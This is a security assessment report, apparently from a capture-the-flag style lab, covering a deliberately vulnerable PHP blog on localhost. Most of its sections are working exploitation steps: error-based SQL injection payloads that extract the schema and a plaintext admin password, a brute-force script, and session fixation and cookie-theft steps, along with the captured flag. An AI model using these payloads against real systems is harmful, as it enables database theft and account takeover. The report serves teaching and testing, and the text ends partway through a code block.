# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:51233
- **Assessment Date:** January 22, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Eight critical authentication vulnerabilities were successfully exploited, demonstrating complete authentication control bypass. The most severe findings include default credentials hardcoded in version control (`admin:ONEverySecurePassword_!`), plaintext credential extraction via SQL injection, and session hijacking due to missing HttpOnly flags. Additional exploited vulnerabilities include session fixation (no session regeneration after authentication), unlimited brute force attempts without rate limiting, missing logout functionality allowing indefinite session persistence, and credential interception over unencrypted HTTP. One time-dependent vulnerability (session timeout extension via probabilistic garbage collection) was confirmed but could not be fully demonstrated within testing timeframes. These vulnerabilities enable immediate admin access without exploitation knowledge, resulting in FLAG capture: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`.

**Authorization Vulnerabilities:**
Two critical vertical privilege escalation vulnerabilities were successfully exploited. First, unauthenticated SQL injection in the category filter (`GET /index.php?category=`) enabled complete database compromise and admin credential extraction using error-based injection techniques, allowing escalation from anonymous to admin role. Second, session fixation vulnerability allowed attackers to pre-establish session IDs that inherit admin privileges after victim authentication, bypassing credential requirements entirely. Both vulnerabilities resulted in unauthorized FLAG access, demonstrating total failure of authorization controls. No horizontal privilege escalation vulnerabilities exist due to the application's single-admin architecture.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found.

**SQL/Command Injection Vulnerabilities:**
One critical SQL injection vulnerability was successfully exploited in the unauthenticated category filter endpoint (`GET /index.php?category=`). The vulnerability stems from a time-of-check-time-of-use (TOCTOU) flaw where user input is used in a SQL query at line 41 before sanitization occurs at line 52. Error-based injection using MySQL's `extractvalue()` function enabled complete database enumeration, including extraction of table schema (admins, comments, posts), database version (MySQL 5.7.44), and plaintext admin credentials. The vulnerability requires no authentication and led to admin credential theft and FLAG capture. No command injection vulnerabilities were identified as the application performs no shell command execution.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found.

## Network Reconnaissance

**Open Ports and Services:**
The target application on port 51233 exposes a deliberately vulnerable PHP blog running Apache 2.4.54 (Debian) with PHP 7.4.33 (End-of-Life: November 2022). Additional non-application ports discovered on the host include port 80/tcp (Caddy reverse proxy), port 443/tcp (SSL/HTTPS via Caddy), port 631/tcp (CUPS printing service), port 9999/tcp (unknown service with permissive CORS headers), and port 49152/tcp (Tailscale VPN with authentication required and security headers present).

**Technology Stack:**
The application uses HTML5 with no JavaScript frameworks, Apache 2.4.54 web server, PHP 7.4.33 (exposed via X-Powered-By header), and runs on Debian Linux. No security-relevant headers detected.

**Subdomain Discovery:**
No subdomains discovered. Application accessible only via localhost:51233.

**Security Findings:**
- End-of-life software detected (PHP 7.4.33 reached EOL November 2022)
- X-Powered-By header exposes PHP version to attackers
- No Web Application Firewall (WAF) detected
- HTTP-only service with no TLS/HTTPS encryption on target port
- No security headers observed (no HSTS, CSP, X-Frame-Options, etc.)

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: Unauthenticated SQL Injection in Category Filter

**Summary:**
- **Vulnerable location:** `GET /index.php?category=` parameter (line 41 in `/var/www/html/index.php`)
- **Overview:** Time-of-check-time-of-use (TOCTOU) SQL injection vulnerability where user input is used in a SQL query before sanitization occurs. Successfully exploited using error-based SQL injection to extract admin credentials, then authenticated to capture the flag.
- **Impact:** Complete database compromise, admin credential extraction, and unauthorized access to protected resources
- **Severity:** Critical

**Prerequisites:**
- Target URL: http://localhost:51233
- No authentication required for initial SQL injection
- Network access to target application

**Exploitation Steps:**

1. **Confirm SQL Injection Vulnerability (Boolean-Based)**
   ```bash
   curl -s --get --data-urlencode "category=' OR '1'='1" "http://localhost:51233/index.php"
   ```
   - **Expected Result:** Query succeeds without "Category does not exist" error
   - **Actual Result:** ✅ Confirmed - boolean injection successful

2. **Verify UNION SELECT Capability**
   ```bash
   curl -s --get --data-urlencode "category=' UNION SELECT NULL-- " "http://localhost:51233/index.php"
   ```
   - **Expected Result:** Query succeeds with single NULL column
   - **Actual Result:** ✅ Confirmed - UNION injection works with 1 column

3. **Extract Database Version (Error-Based)**
   ```bash
   curl -s --get --data-urlencode "category=' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- " "http://localhost:51233/index.php" 2>&1 | grep -i "XPATH"
   ```
   - **Result:** `Error in query: XPATH syntax error: '~5.7.44~'`
   - **Database Version:** MySQL 5.7.44

4. **Extract Current Database User**
   ```bash
   curl -s --get --data-urlencode "category=' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))-- " "http://localhost:51233/index.php" 2>&1 | grep -i "XPATH"
   ```
   - **Result:** `Error in query: XPATH syntax error: '~user@10.89.89.3~'`
   - **Database User:** user@10.89.89.3

5. **Extract Current Database Name**
   ```bash
   curl -s --get --data-urlencode "category=' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- " "http://localhost:51233/index.php" 2>&1 | grep -i "XPATH"
   ```
   - **Result:** `Error in query: XPATH syntax error: '~blogDB~'`
   - **Database Name:** blogDB

6. **Enumerate All Tables in Database**
   ```bash
   curl -s --get --data-urlencode "category=' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- " "http://localhost:51233/index.php" 2>&1 | grep -i "XPATH"
   ```
   - **Result:** `Error in query: XPATH syntax error: '~admins,comments,posts~'`
   - **Tables Found:** admins, comments, posts

7. **Extract Column Names from admins Table**
   ```bash
   curl -s --get --data-urlencode "category=' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='admins'),0x7e))-- " "http://localhost:51233/index.php" 2>&1 | grep -i "XPATH"
   ```
   - **Result:** `Error in query: XPATH syntax error: '~id,username,password~'`
   - **Columns:** id, username, password

8. **Extract Admin Username**
   ```bash
   curl -s --get --data-urlencode "category=' AND extractvalue(1,concat(0x7e,(SELECT username FROM admins LIMIT 1),0x7e))-- " "http://localhost:51233/index.php" 2>&1 | grep -i "XPATH"
   ```
   - **Result:** `Error in query: XPATH syntax error: '~admin~'`
   - **Username:** admin

9. **Extract Admin Password**
   ```bash
   curl -s --get --data-urlencode "category=' AND extractvalue(1,concat(0x7e,(SELECT password FROM admins LIMIT 1),0x7e))-- " "http://localhost:51233/index.php" 2>&1 | grep -i "XPATH"
   ```
   - **Result:** `Error in query: XPATH syntax error: '~ONEverySecurePassword_!~'`
   - **Password:** ONEverySecurePassword_!

10. **Extract Complete Admin Record**
    ```bash
    curl -s --get --data-urlencode "category=' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(id,':',username,':',password) FROM admins),0x7e))-- " "http://localhost:51233/index.php" 2>&1 | grep -i "XPATH"
    ```
    - **Result:** `Error in query: XPATH syntax error: '~1:admin:ONEverySecurePassword_!'`
    - **Complete Record:** ID=1, Username=admin, Password=ONEverySecurePassword_!

11. **Authenticate with Extracted Credentials**
    ```bash
    curl -s -c cookies.txt -b cookies.txt -X POST -d "username=admin&password=ONEverySecurePassword_!" "http://localhost:51233/admin.php"
    ```
    - **Result:** Authentication successful, flag revealed in response

12. **Capture the Flag**
    ```bash
    curl -s -b cookies.txt "http://localhost:51233/admin.php" | head -1
    ```
    - **FLAG CAPTURED:** `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Proof of Impact:**

**1. Database Fingerprinting Confirmed:**
- MySQL version: 5.7.44
- Database name: blogDB
- Database user: user@10.89.89.3
- Tables: admins, comments, posts

**2. Complete Database Schema Extraction:**
- admins table columns: id, username, password
- Successfully enumerated all tables via information_schema

**3. Credential Theft:**
- **Extracted Admin Credentials:**
  - Username: `admin`
  - Password: `ONEverySecurePassword_!` (plaintext - no hashing)
  - Record ID: 1

**4. Authentication Bypass & Privilege Escalation:**
- Successfully authenticated using stolen credentials
- Escalated from anonymous user to admin role
- Established persistent session via PHPSESSID cookie

**5. Flag Capture (Critical Impact):**
```
FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}
```

**6. Additional Data Access Proof:**
```bash
curl -s --get --data-urlencode "category=' AND extractvalue(1,concat(0x7e,(SELECT title FROM posts LIMIT 1),0x7e))-- " "http://localhost:51233/index.php" 2>&1 | grep -i "XPATH"
```
- **Result:** `Error in query: XPATH syntax error: '~The Magic of Morning Dew~'`
- **Proof:** Can extract data from posts table as well

**Technical Details:**

**Vulnerability Root Cause:**
The application uses unsanitized user input directly in a SQL query at line 41 of index.php:
```php
$result = $conn->query("SELECT DISTINCT category FROM posts where category = '" . $unescaped_category . "'");
```

The variable name `$unescaped_category` explicitly indicates the developer's awareness that sanitization is missing. While `mysqli_real_escape_string()` is applied at line 52, this occurs AFTER the vulnerable query has already executed, creating a classic time-of-check-time-of-use (TOCTOU) vulnerability.

**Exploitation Technique Used:**
Error-based SQL injection using MySQL's `extractvalue()` function. This technique triggers intentional XPATH syntax errors that leak data in the error message:
```sql
extractvalue(1, concat(0x7e, (SELECT sensitive_data), 0x7e))
```

The `0x7e` (tilde character `~`) is used as a delimiter to clearly identify the extracted data in error messages.

**Why This Works:**
1. No WAF or input filtering detected
2. PHP error display enabled (visible MySQL errors)
3. String concatenation instead of prepared statements
4. No rate limiting on requests
5. Plaintext password storage (no hashing)

**Attack Chain Summary:**
```
Unauthenticated User
    ↓
SQL Injection in category parameter
    ↓
Error-based data extraction
    ↓
Database schema enumeration
    ↓
Admin credential theft (plaintext)
    ↓
Authentication with stolen credentials
    ↓
Admin session established
    ↓
FLAG captured
```

**Notes:**

1. **Multiple Exploitation Paths Available:**
   - Boolean-based blind SQL injection (confirmed working)
   - UNION-based injection (confirmed working, 1 column)
   - Error-based injection (used for exploitation)
   - Time-based blind injection (available as fallback)

2. **No Defensive Measures Encountered:**
   - No Web Application Firewall (WAF)
   - No input filtering or validation
   - No rate limiting
   - No SQL injection protection mechanisms
   - Error messages fully disclosed to attacker

3. **Complete Database Access Achieved:**
   - Can read from any table
   - Can enumerate complete schema
   - Can extract sensitive data at will
   - May be able to modify data (not tested to avoid data integrity issues)

4. **Plaintext Password Storage:**
   - Passwords stored without hashing (critical vulnerability)
   - Enables immediate credential use after extraction
   - No password_verify() or bcrypt/argon2 hashing observed

5. **Session Security Issues:**
   - No HttpOnly flag on session cookies
   - No Secure flag (transmitted over HTTP)
   - No session regeneration after authentication
   - Vulnerable to session fixation and theft

6. **Reproducibility:**
   - All commands fully reproducible
   - No timing dependencies
   - No race conditions
   - Consistent results across multiple runs

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-07: Default Credential Authentication

**Summary:**
- **Vulnerable location:** POST http://localhost:51233/admin.php (authentication endpoint)
- **Overview:** Hardcoded default credentials (`admin:ONEverySecurePassword_!`) committed to version control in `db_init.sql` line 58, allowing immediate authentication without any exploitation
- **Impact:** Complete authentication bypass - attacker gains immediate admin access and retrieves FLAG
- **Severity:** CRITICAL

**Prerequisites:**
None - credentials are publicly accessible in the Git repository

**Exploitation Steps:**

1. Submit authentication request with default credentials:
```bash
curl -X POST http://localhost:51233/admin.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=ONEverySecurePassword_!" \
  -c /tmp/auth_cookies.txt
```

2. Server responds with authenticated session and FLAG:
```
FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}
Set-Cookie: PHPSESSID=6002fba4f58d2db4aaced68c1a8e5987; path=/
```

3. Verify authenticated access with session cookie:
```bash
curl http://localhost:51233/admin.php \
  -b "PHPSESSID=6002fba4f58d2db4aaced68c1a8e5987"
```

**Proof of Impact:**
Successfully retrieved FLAG: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Default credentials are hardcoded in `/app/db_init.sql` line 58: `INSERT INTO admins (username, password) VALUES ('admin', 'ONEverySecurePassword_!');`

---

### AUTH-VULN-06: Plaintext Credential Extraction via SQL Injection

**Summary:**
- **Vulnerable location:** GET http://localhost:51233/index.php?category=[INJECTION] (line 41 in index.php)
- **Overview:** SQL injection vulnerability in category parameter allows extraction of plaintext admin password from database using error-based injection
- **Impact:** Credential extraction leading to authentication bypass and FLAG capture
- **Severity:** CRITICAL

**Prerequisites:**
None - SQL injection endpoint is publicly accessible

**Exploitation Steps:**

1. Exploit error-based SQL injection to extract admin password:
```bash
curl "http://localhost:51233/index.php" \
  --get \
  --data-urlencode "category=' AND extractvalue(1,concat(0x7e,(SELECT password FROM admins LIMIT 1)))-- -"
```

2. Server returns error message containing plaintext password:
```
Error in query: XPATH syntax error: '~ONEverySecurePassword_!'
```

3. Extract password from error message: `ONEverySecurePassword_!`

4. Authenticate with extracted credentials:
```bash
curl -X POST http://localhost:51233/admin.php \
  -d "username=admin&password=ONEverySecurePassword_!"
```

5. Server grants authenticated session and returns FLAG

**Proof of Impact:**
- Extracted password: `ONEverySecurePassword_!`
- Successfully authenticated and retrieved FLAG: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Vulnerability exists at `/app/html/index.php` line 41 where `$unescaped_category` is used directly in SQL query before sanitization occurs at line 52. Password is stored in plaintext in `admins` table.

---

### AUTH-VULN-03: Session Hijacking via Non-HttpOnly Cookie

**Summary:**
- **Vulnerable location:** All authenticated requests using PHPSESSID cookie
- **Overview:** Session cookie lacks HttpOnly flag, allowing JavaScript access via `document.cookie`, enabling XSS-based session theft
- **Impact:** Account takeover through session hijacking - attacker can steal admin session and access protected resources
- **Severity:** HIGH

**Prerequisites:**
- Attacker must execute JavaScript in victim's browser context (e.g., via XSS vulnerability)
- Or attacker intercepts HTTP traffic to capture cookie

**Exploitation Steps:**

1. Victim authenticates to admin panel:
```bash
curl -X POST http://localhost:51233/admin.php \
  -d "username=admin&password=ONEverySecurePassword_!" \
  -c /tmp/victim_session.txt
```

2. Attacker executes JavaScript in victim's browser to steal cookie:
```javascript
document.cookie
// Returns: "PHPSESSID=6fad664d8d92511ac157b4f393f699b6"
```

3. Attacker uses stolen session cookie to hijack authenticated session:
```bash
curl http://localhost:51233/admin.php \
  -H "Cookie: PHPSESSID=6fad664d8d92511ac157b4f393f699b6"
```

**Proof of Impact:**
- JavaScript successfully accessed session cookie: `PHPSESSID=6fad664d8d92511ac157b4f393f699b6`
- Stolen cookie granted full admin access and FLAG retrieval: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Session cookie is created at `/app/html/admin.php` line 2 with `session_start()` but no `session_set_cookie_params()` configuration exists to set HttpOnly flag. This vulnerability can be chained with stored XSS vulnerabilities in the blog application.

---

### AUTH-VULN-04: Session Fixation Attack

**Summary:**
- **Vulnerable location:** POST http://localhost:51233/admin.php (authentication handler)
- **Overview:** Session ID is not regenerated after successful authentication, allowing attacker to pre-set victim's session ID and hijack it after victim authenticates
- **Impact:** Account takeover through session fixation - attacker gains admin access without knowing credentials
- **Severity:** HIGH

**Prerequisites:**
- Attacker must convince victim to authenticate using a pre-set session ID (via social engineering, cookie injection, or malicious link)

**Exploitation Steps:**

1. Attacker creates a known session ID by visiting admin page:
```bash
curl http://localhost:51233/admin.php -c /tmp/attacker_session.txt
```

Session created: `PHPSESSID=3e92798f295ee15f7f656c8a6c34b147`

2. Attacker fixes victim's session to this ID (via social engineering, injected cookie, etc.)

3. Victim authenticates using the fixed session ID:
```bash
curl -X POST http://localhost:51233/admin.php \
  -b "PHPSESSID=3e92798f295ee15f7f656c8a6c34b147" \
  -d "username=admin&password=ONEverySecurePassword_!"
```

Response: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

4. Attacker uses the same session ID to hijack authenticated session:
```bash
curl http://localhost:51233/admin.php \
  -b "PHPSESSID=3e92798f295ee15f7f656c8a6c34b147"
```

**Proof of Impact:**
- Session ID `3e92798f295ee15f7f656c8a6c34b147` remained unchanged after authentication
- Attacker successfully accessed admin panel using pre-set session ID
- Retrieved FLAG: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Code at `/app/html/admin.php` lines 23-26 sets `$_SESSION['admin_logged_in'] = true` without calling `session_regenerate_id(true)`. No session ID rotation occurs during authentication.

---

### AUTH-VULN-08: Brute Force Attack without Rate Limiting

**Summary:**
- **Vulnerable location:** POST http://localhost:51233/admin.php (authentication endpoint)
- **Overview:** No rate limiting, CAPTCHA, or account lockout on authentication endpoint, allowing unlimited password guessing attempts at full network speed
- **Impact:** Successful brute force attack - discovered valid password after 6 rapid attempts with no throttling
- **Severity:** HIGH

**Prerequisites:**
None - authentication endpoint is publicly accessible with no rate limiting

**Exploitation Steps:**

1. Execute automated brute force attack with common password list:
```python
import requests
import time

target = "http://localhost:51233/admin.php"
username = "admin"
passwords = ['admin', 'password', '123456', 'admin123', 'password123', 'ONEverySecurePassword_!']

for i, pwd in enumerate(passwords, 1):
    start = time.time()
    response = requests.post(target, data={'username': username, 'password': pwd})
    elapsed = time.time() - start

    success = "FLAG" in response.text
    print(f"Attempt #{i} - Password: {pwd} - {'SUCCESS' if success else 'FAILED'} ({elapsed:.3f}s)")

    if success:
        print(f"Valid password found: {pwd}")
        break
```

2. Brute force attack results:
```
Attempt #1 - Password: admin - FAILED (0.012s)
Attempt #2 - Password: password - FAILED (0.010s)
Attempt #3 - Password: 123456 - FAILED (0.018s)
Attempt #4 - Password: admin123 - FAILED (0.012s)
Attempt #5 - Password: password123 - FAILED (0.010s)
Attempt #6 - Password: ONEverySecurePassword_! - SUCCESS (0.008s)
Valid password found: ONEverySecurePassword_!
```

**Proof of Impact:**
- Successfully performed 6 authentication attempts in 0.693 seconds (average 0.012s per attempt)
- No rate limiting detected - all attempts processed without delays or blocking
- Discovered valid password and retrieved FLAG: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Authentication handler at `/app/html/admin.php` lines 11-29 has no attempt tracking, throttling, CAPTCHA, or account lockout mechanisms. No rate limiting at Apache or infrastructure level.

---

### AUTH-VULN-05: Missing Logout Functionality for Session Persistence

**Summary:**
- **Vulnerable location:** Application-wide (no logout endpoint exists)
- **Overview:** No logout functionality exists in the application - users cannot terminate their authenticated sessions, making hijacked sessions persist indefinitely
- **Impact:** Extends window for session hijacking attacks - compromised sessions cannot be invalidated by legitimate users
- **Severity:** MEDIUM

**Prerequisites:**
- Attacker must first compromise a session (via AUTH-VULN-03, AUTH-VULN-04, or AUTH-VULN-10)

**Exploitation Steps:**

1. Admin authenticates and establishes session:
```bash
curl -X POST http://localhost:51233/admin.php \
  -c /tmp/admin_session.txt \
  -d "username=admin&password=ONEverySecurePassword_!"
```

Session created: `PHPSESSID=7d4bc9a36bfaea17febf2557a8355e20`

2. Session is compromised (via XSS, network interception, etc.)

3. Admin attempts to logout but no endpoint exists:
```bash
curl http://localhost:51233/logout.php
```

Response: `404 Not Found - The requested URL was not found on this server`

4. Attacker continues accessing admin panel with compromised session:
```bash
curl http://localhost:51233/admin.php \
  -b "PHPSESSID=7d4bc9a36bfaea17febf2557a8355e20"
```

**Proof of Impact:**
- No logout endpoint exists (confirmed via 404 error on /logout.php)
- No `session_destroy()` or `session_unset()` calls found in codebase
- Compromised session successfully accessed FLAG after attempted logout: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Searched entire codebase for logout functionality - zero matches found for `session_destroy()`, `session_unset()`, or logout-related files. Sessions persist until PHP garbage collection (probabilistic, ~24 minutes) or browser closure.

---

### AUTH-VULN-10: Session Replay from Different IP/Browser

**Summary:**
- **Vulnerable location:** GET http://localhost:51233/admin.php (session validation logic)
- **Overview:** Session validation only checks boolean flag existence with no binding to IP address, user agent, or client fingerprint
- **Impact:** Stolen session cookies can be replayed from any location/browser - enables account takeover from attacker's device
- **Severity:** HIGH

**Prerequisites:**
- Attacker must obtain valid session cookie (via AUTH-VULN-03, network interception, or other session theft)

**Exploitation Steps:**

1. Victim authenticates from Windows Chrome browser:
```bash
curl -X POST http://localhost:51233/admin.php \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/100" \
  -c /tmp/windows_session.txt \
  -d "username=admin&password=ONEverySecurePassword_!"
```

Session created: `PHPSESSID=22c25f25d74cc2a3963f9430d815be1e`

2. Attacker steals session cookie and replays from iPhone Safari:
```bash
curl http://localhost:51233/admin.php \
  -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0) Safari/14" \
  -b "PHPSESSID=22c25f25d74cc2a3963f9430d815be1e"
```

Response: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

3. Attacker replays again from Android Firefox:
```bash
curl http://localhost:51233/admin.php \
  -H "User-Agent: Mozilla/5.0 (Linux; Android 11) Firefox/90" \
  -b "PHPSESSID=22c25f25d74cc2a3963f9430d815be1e"
```

Response: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Proof of Impact:**
- Session created from Windows Chrome successfully replayed from iPhone Safari and Android Firefox
- No validation of user agent, IP address, or client properties
- Attacker successfully accessed FLAG from completely different device/browser contexts: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Session validation at `/app/html/admin.php` lines 5-8 only checks `isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true` with no additional session binding or integrity checks.

---

### AUTH-VULN-01: Credential Interception over HTTP (Network Attack)

**Summary:**
- **Vulnerable location:** POST http://localhost:51233/admin.php (all authentication traffic)
- **Overview:** Application serves all content over unencrypted HTTP with no HTTPS/TLS configuration, transmitting credentials in plaintext POST bodies
- **Impact:** Credentials and session cookies exposed to network interception via packet sniffing or man-in-the-middle attacks
- **Severity:** CRITICAL

**Prerequisites:**
- Attacker must be positioned on the same network as victim (same WiFi, LAN, or ISP-level access)
- Requires network packet capture tools (tcpdump, Wireshark, etc.)

**Exploitation Steps:**

1. Verify application uses HTTP (not HTTPS):
```bash
curl -v -X POST http://localhost:51233/admin.php \
  -d "username=admin&password=ONEverySecurePassword_!"
```

Headers show:
```
> POST /admin.php HTTP/1.1
> Host: localhost:51233
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 48
```

2. POST body transmitted in plaintext:
```
username=admin&password=ONEverySecurePassword_!
```

3. Attacker on same network performs packet sniffing to capture:
   - Plaintext credentials from POST body
   - Session cookies from response headers

4. Attacker authenticates with captured credentials:
```bash
curl -X POST http://localhost:51233/admin.php \
  -d "username=admin&password=ONEverySecurePassword_!"
```

**Proof of Impact:**
- Confirmed HTTP-only transmission (no HTTPS/TLS)
- Credentials transmitted in plaintext POST body
- Apache configuration shows `<VirtualHost *:80>` with no SSL directives
- Successful authentication with interceptable credentials retrieves FLAG: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Apache configuration at `/app/000-default.conf` line 1 shows HTTP-only VirtualHost with no SSL certificates or HTTPS redirect. Docker compose maps port 51233:80. This vulnerability requires network positioning but is externally exploitable from same network segment.

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: SQL Injection Enabling Vertical Privilege Escalation

**Summary:**
- **Vulnerable location:** `GET /index.php?category=` parameter at line 41 of `/app/html/index.php`
- **Overview:** Error-based SQL injection in category validation query allows extraction of admin credentials from database, enabling complete vertical privilege escalation from anonymous user to admin role
- **Impact:** Anonymous attacker can extract plaintext admin credentials, authenticate as admin, and access protected FLAG resource - complete authorization bypass
- **Severity:** CRITICAL

**Prerequisites:**
None - vulnerability is exploitable by unauthenticated anonymous users from external network position

**Exploitation Steps:**

1. **Extract admin password using error-based SQL injection**
   ```bash
   curl -s "http://localhost:51233/?category=%27%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20password%20FROM%20admins%20LIMIT%201),0x7e))%23"
   ```

   **Expected Response:** Error message reveals password in XPATH syntax error
   ```
   Error in query: XPATH syntax error: '~ONEverySecurePassword_!~'
   ```

   **Extracted Credential:** `admin:ONEverySecurePassword_!`

2. **Authenticate as admin using extracted credentials**
   ```bash
   curl -s -c /tmp/admin_cookies.txt "http://localhost:51233/admin.php" \
     -X POST \
     -d "username=admin&password=ONEverySecurePassword_!"
   ```

   **Expected Response:** Immediate FLAG display upon successful authentication
   ```
   FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}
   ```

3. **Verify persistent admin access using established session**
   ```bash
   curl -s -b /tmp/admin_cookies.txt "http://localhost:51233/admin.php"
   ```

   **Expected Response:** FLAG displayed without re-authentication
   ```
   FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}
   ```

**Proof of Impact:**

✅ **Flag Captured:** `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

✅ **Vertical Privilege Escalation Confirmed:** Successfully escalated from anonymous (privilege level 0) to admin (privilege level 10) without requiring any prior authentication or credentials

✅ **Authorization Bypass Demonstrated:** Accessed protected admin-only FLAG resource that should be restricted to authenticated admin users only

✅ **Complete Attack Chain:**
- Anonymous user → SQL injection → Credential extraction → Authentication → Admin session → FLAG access
- Total exploitation time: 3 HTTP requests
- No authentication required to begin attack
- Externally exploitable from internet position via http://localhost:51233

**Technical Details:**

**Root Cause:** User input from `$_GET['category']` is concatenated directly into SQL query at line 41 BEFORE sanitization occurs at line 52, creating a time-of-check-time-of-use (TOCTOU) vulnerability:

```php
// Line 37: Unescaped input capture
$unescaped_category = isset($_GET['category']) ? $_GET['category'] : '';

// Line 41: VULNERABLE - SQL injection before sanitization
$result = $conn->query("SELECT DISTINCT category FROM posts where category = '" . $unescaped_category . "'");

// Line 52: Sanitization TOO LATE - damage already done
$category = mysqli_real_escape_string($conn, $unescaped_category);
```

**Attack Vector:** EXTRACTVALUE-based error injection forces MySQL to display subquery results in error messages, bypassing output restrictions

**Authorization Impact:** Plaintext password storage in database combined with SQL injection creates direct path to credential-based authentication bypass

**Notes:**

- **Critical Design Flaw:** Admin credentials stored in plaintext (no password hashing), making extracted credentials immediately usable
- **No Rate Limiting:** Unlimited authentication attempts possible after credential extraction
- **No Session Timeout:** Admin session persists indefinitely without expiration
- **HTTP Transmission:** All credentials and FLAG data transmitted unencrypted over HTTP (port 51233)
- **Single Admin Account:** Only one admin exists (username='admin'), simplifying target selection for attackers

---

### AUTHZ-VULN-02: Session Fixation Enabling Authentication Bypass

**Summary:**
- **Vulnerable location:** `POST /admin.php` authentication handler at line 25 of `/app/html/admin.php`
- **Overview:** Missing `session_regenerate_id()` after successful authentication allows attacker to fix victim's session ID before authentication, then inherit admin privileges after victim authenticates
- **Impact:** Attacker can escalate from anonymous to admin role by controlling session establishment, bypassing credential verification entirely
- **Severity:** HIGH

**Prerequisites:**
- Victim admin must authenticate using attacker-controlled session ID (requires social engineering)
- Attack techniques include: phishing link with session ID in URL parameter, cookie injection via XSS, or man-in-the-middle position

**Exploitation Steps:**

1. **Attacker obtains controlled session ID**
   ```bash
   curl -s -c /tmp/attacker_session.txt "http://localhost:51233/admin.php" > /dev/null
   cat /tmp/attacker_session.txt | grep PHPSESSID
   ```

   **Expected Response:** New session cookie created
   ```
   localhost	FALSE	/	FALSE	0	PHPSESSID	0bf4353bd8027d71314ad6a66df1215c
   ```

   **Attacker's Controlled Session ID:** `0bf4353bd8027d71314ad6a66df1215c`

2. **Attacker tricks victim admin to authenticate using this session**

   **Social Engineering Method (URL-based):**
   - Send phishing link: `http://localhost:51233/admin.php?PHPSESSID=0bf4353bd8027d71314ad6a66df1215c`
   - Victim clicks link and authenticates with valid credentials

   **Alternative Method (Cookie injection via XSS):**
   - If XSS vulnerability exists, inject: `document.cookie='PHPSESSID=0bf4353bd8027d71314ad6a66df1215c'`

   **Simulated Victim Authentication:**
   ```bash
   curl -s -b "PHPSESSID=0bf4353bd8027d71314ad6a66df1215c" \
     "http://localhost:51233/admin.php" \
     -X POST \
     -d "username=admin&password=ONEverySecurePassword_!" \
     -o /tmp/victim_auth.html
   ```

   **Server-side Effect:** Sets `$_SESSION['admin_logged_in'] = true` in attacker's controlled session without regenerating session ID

3. **Attacker accesses admin panel using same fixed session ID**
   ```bash
   curl -s -b "PHPSESSID=0bf4353bd8027d71314ad6a66df1215c" \
     "http://localhost:51233/admin.php"
   ```

   **Expected Response:** FLAG displayed without attacker knowing credentials
   ```
   FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}
   ```

**Proof of Impact:**

✅ **Flag Captured:** `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

✅ **Authorization Bypass Confirmed:** Attacker gained admin privileges without knowing valid credentials by controlling session establishment process

✅ **Session ID Persistence Verified:** Session ID remained identical before and after authentication:
- Pre-authentication: `PHPSESSID=253a000c4eec3240a6c26bf0b48e95a6`
- Post-authentication: `PHPSESSID=253a000c4eec3240a6c26bf0b48e95a6`
- No session regeneration occurred, confirming vulnerability

✅ **Vertical Privilege Escalation:** Successfully escalated from anonymous (attacker position) to admin by hijacking session establishment

**Technical Details:**

**Root Cause:** Application sets privileged session variable without regenerating session ID after successful authentication:

```php
// Lines 23-26: Session set WITHOUT regeneration
if ($result->num_rows == 1) {
    $_SESSION['admin_logged_in'] = true;  // ← Missing session_regenerate_id()!
    echo "@FLAG@";
}
```

**Expected Secure Implementation:**
```php
if ($result->num_rows == 1) {
